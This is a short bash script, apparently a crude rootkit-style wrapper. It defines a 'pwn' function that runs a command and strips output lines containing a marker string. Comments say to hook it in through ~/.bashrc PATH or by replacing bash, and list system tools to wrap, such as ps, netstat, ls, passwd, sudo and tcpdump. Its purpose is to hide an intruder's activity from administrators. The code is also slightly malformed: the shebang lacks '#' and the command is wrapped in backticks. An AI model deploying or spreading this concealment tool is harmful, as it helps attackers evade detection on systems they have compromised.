!/bin/bash
# edit ~/.bashrc PATH or replace bash
function pwn(){
	`echo "$@"|grep -v THINGTOHIDE 2>&1`;
}
pwn "$@"|grep -v THINGTOHIDE
# files:
# netstat
# iptables
# kill
# ps
# pgrep
# pkill
# ls
# rm
# rmdir
# passwd
# shutdown
# chmod
# sudo
# su
# cat
# useradd
# id
# ln
# unlink
# which
# gpasswd
# bash
# sh
# env
# echo
# history
# tcpdump
# chattr
# lsattr
# export
# mv
# grep
# egrep
